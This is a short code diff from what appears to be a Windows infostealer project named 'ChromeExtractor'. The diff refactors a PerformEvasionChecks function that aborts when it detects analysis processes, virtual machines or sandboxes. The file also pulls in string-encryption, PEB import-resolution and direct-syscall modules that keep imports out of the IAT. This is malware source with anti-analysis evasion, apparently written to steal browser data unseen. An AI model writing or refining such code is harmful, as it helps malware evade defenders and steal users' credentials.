@@ -1,6 +1,6 @@
 #define WIN32_LEAN_AND_MEAN
 #include <windows.h>
-#pragma comment(lib, "kernel32.lib")
+// kernel32 linked via CRT — no explicit pragma needed
 
 #include "str_encrypt.h"
 #include "peb_resolve.h"
@@ -10,6 +10,7 @@
 // entries in the IAT.
 
 using namespace ChromeExtractor::Syscalls;
+using namespace ChromeExtractor::Imports;
 
 // ── cached module handles (file-local) ─────────────────────────────────────
 
@@ -210,15 +211,10 @@ static bool IsLikelySandbox_Check(DWORD proc_count) {
 }
 
 bool PerformEvasionChecks() {
-    DWORD proc_count = 0;
-    if (IsSuspiciousProcess_Check(&proc_count))
-        return false;
-
-    if (IsVirtualMachine_Check() || IsKnownSandbox_Check())
-        return false;
-
-    if (IsLikelySandbox_Check(proc_count))
-        return false;
-
+    DWORD procCount = 0;
+    if (IsSuspiciousProcess_Check(&procCount)) return false;
+    if (IsVirtualMachine_Check())              return false;
+    if (IsKnownSandbox_Check())                return false;
+    if (IsLikelySandbox_Check(procCount))      return false;
     return true;
 }
